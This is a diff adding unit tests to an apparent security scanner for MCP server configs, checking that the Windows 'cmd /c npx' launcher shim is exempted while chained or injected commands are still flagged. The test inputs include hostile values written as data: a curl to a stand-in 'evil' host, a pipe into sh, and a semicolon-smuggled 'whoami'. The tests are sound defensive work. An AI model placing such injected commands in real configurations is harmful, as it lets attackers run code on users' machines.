@@ -483,3 +483,68 @@ class TestRealWorldRegressions(unittest.TestCase):
 
 if __name__ == "__main__":
     unittest.main(verbosity=2)
+
+
+class TestWindowsLauncherShim(unittest.TestCase):
+    """`cmd /c npx ...` is what the official servers repository tells Windows
+    users to write, because package runners ship as batch files there and
+    CreateProcess cannot execute a .cmd directly.
+
+    Found by scanning the 27 config examples in the official MCP servers repo
+    and SDKs: seven were this shape, every one a HIGH nobody could act on. A
+    finding with no available fix is how a scanner gets uninstalled, after
+    which it catches nothing at all.
+
+    The exemption has to stay narrow, so most of this is proving it is.
+    """
+
+    def _fires(self, command: str, args: list) -> bool:
+        from mcp_audit.model import ServerSpec
+        spec = ServerSpec(name="s", source="/c/.mcp.json", client="t",
+                          transport="stdio", command=command, args=args)
+        return any(f.rule_id == "MCPA001"
+                   for f in run_rules(AuditContext(servers=[spec])))
+
+    def test_the_documented_shape_is_silent(self) -> None:
+        self.assertFalse(self._fires(
+            "cmd", ["/c", "npx", "-y", "@modelcontextprotocol/server-everything"]))
+        self.assertFalse(self._fires("cmd", ["/c", "uvx", "mcp-server-git"]))
+
+    def test_a_chained_command_still_fires(self) -> None:
+        self.assertTrue(self._fires(
+            "cmd", ["/c", "npx", "-y", "pkg", "&&", "curl", "http://evil/x"]))
+
+    def test_a_pipe_still_fires(self) -> None:
+        self.assertTrue(self._fires("cmd", ["/c", "npx", "pkg", "|", "sh"]))
+
+    def test_a_semicolon_inside_an_argument_still_fires(self) -> None:
+        self.assertTrue(self._fires("cmd", ["/c", "npx", "pkg;whoami"]))
+
+    def test_something_other_than_a_package_runner_still_fires(self) -> None:
+        """A .exe can be launched directly, so routing it through cmd is a
+        choice rather than a necessity."""
+        self.assertTrue(self._fires("cmd", ["/c", "evil.exe", "--flag"]))
+
+    def test_slash_k_still_fires(self) -> None:
+        """/k leaves the shell running afterwards; only /c is the shim."""
+        self.assertTrue(self._fires("cmd", ["/k", "npx", "-y", "pkg"]))
+
+    def test_other_shells_are_not_exempt(self) -> None:
+        for shell, args in (("bash", ["-c", "npx -y pkg"]),
+                            ("powershell", ["-c", "npx pkg"]),
+                            ("sh", ["-c", "npx pkg"])):
+            self.assertTrue(self._fires(shell, args), shell)
+
+    def test_cmd_without_slash_c_still_fires(self) -> None:
+        self.assertTrue(self._fires("cmd", ["npx", "pkg"]))
+
+    def test_the_package_risk_is_still_reported(self) -> None:
+        """Exempting the shell does not exempt the unpinned package: MCPA003
+        is what actually matters about this line."""
+        from mcp_audit.model import ServerSpec
+        spec = ServerSpec(name="s", source="/c/.mcp.json", client="t",
+                          transport="stdio", command="cmd",
+                          args=["/c", "npx", "-y", "@scope/server"])
+        found = {f.rule_id for f in run_rules(AuditContext(servers=[spec]))}
+        self.assertNotIn("MCPA001", found)
+        self.assertIn("MCPA003", found)
